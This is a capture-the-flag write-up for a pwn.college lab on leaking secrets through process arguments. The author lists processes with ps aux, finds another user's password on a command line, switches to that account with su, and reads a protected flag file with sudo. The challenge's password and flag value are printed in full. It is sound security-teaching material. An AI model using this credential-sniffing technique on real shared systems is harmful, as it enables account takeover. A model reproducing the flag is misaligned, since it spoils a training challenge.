# Silly Shenanigins

## Sniffing Process Arguments
Poor Zardus; you've hacked him pretty heavily. But he's wisened up and secured his home directory! Game over?

Not quite! One of the things that people often don't think about when there are multiple accounts on one computer is what kind of data their command invocations leak. Remember, when you do ps aux, you get:

```bash
hacker@dojo:~$ ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
hacker         1  0.0  0.0   1128     4 ?        Ss   05:34   0:00 /sbin/docker-init -- /bin/sleep 6h
hacker         7  0.0  0.0   2736   580 ?        S    05:34   0:00 /bin/sleep 6h
hacker       102  0.4  0.0 723944 64660 ?        Sl   05:34   0:00 /usr/lib/code-server/lib/node /usr/lib/code-serve
hacker       138  3.3  0.0 968792 106272 ?       Sl   05:34   0:07 /usr/lib/code-server/lib/node /usr/lib/code-serve
hacker       287  0.0  0.0 717648 53136 ?        Sl   05:34   0:00 /usr/lib/code-server/lib/node /usr/lib/code-serve
hacker       318  3.3  0.0 977472 98256 ?        Sl   05:34   0:06 /usr/lib/code-server/lib/node --dns-result-order=
hacker      1172  0.0  0.0   5892  2924 pts/0    R+   05:38   0:00 ps aux
hacker@dojo:~$
```

But what would happen if one of the arguments of one of those commands was something sensitive, like the flag or a password?

### Objective
Zardus is using an automation script, passing his account password to it as an argument. Zardus is also allowed to use sudo (and, thus, to sudo cat /flag!). Steal the password, log in to Zardus' account (recall the su command from the Untangling Users module), and get that flag!

### Solve
**Flag:** `pwn.college{Q-ZYpio3l5FA-bYo-2Y_sgHiGnA.QX4MTM3EDLygjN0czW}`

- As the challenge description states, some commands can require sensitive info like username and password as arguments and they can be easily visible by listing all the processes running at the time. Therefore, I used the `ps aux` command to list the processes. 
- From there, I found the password for the username zardus.
- Then, using `su` command, I logged in as zardus user and then used his privilege to get the flag using the `sudo cat /flag` command.


```bash
hacker@shenanigans~sniffing-process-arguments:~$ ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.3  0.0   1056   640 ?        Ss   15:03   0:00 /sbin/docker-init -- /nix/var/nix/profiles/dojo-workspace/bin/dojo-init /run/do
root           7  0.1  0.0 231708  2560 ?        S    15:03   0:00 /run/dojo/bin/sleep 6h
root         147  0.0  0.0   5204  3520 ?        S    15:03   0:00 su -c auto.sh --user zardus --pass pw_163612806 zardus
zardus       151  0.0  0.0   4132  2560 ?        Ss   15:03   0:00 /bin/bash /run/challenge/bin/auto.sh --user zardus --pass pw_163612806
zardus       152  0.0  0.0 231708  2560 ?        S    15:03   0:00 sleep 6h
hacker       165  0.1  0.0  36972 21760 ?        Sl   15:03   0:00 /nix/store/g0q8n7xfjp7znj41hcgrq893a9m0i474-ttyd-1.7.7/bin/ttyd --port 7681 --i
hacker       169  0.0  0.0 231940  4160 pts/0    Ss   15:03   0:00 /run/dojo/bin/bash --login
hacker       179  0.0  0.0 233600  3840 pts/0    R+   15:03   0:00 ps aux
hacker@shenanigans~sniffing-process-arguments:~$ su zardus
Password: 
zardus@shenanigans~sniffing-process-arguments:/home/hacker$ sudo cat/flag
sudo: cat/flag: command not found
zardus@shenanigans~sniffing-process-arguments:/home/hacker$ sudo cat /flag
pwn.college{Q-ZYpio3l5FA-bYo-2Y_sgHiGnA.QX4MTM3EDLygjN0czW}
```

### New Learnings
1. Even if we close the access to our files and directories, the process we run on the terminal might still be accessed. Some of those processes can contain important info like passwords and usernames. As a result, someone else can gain access to out accounts by using them.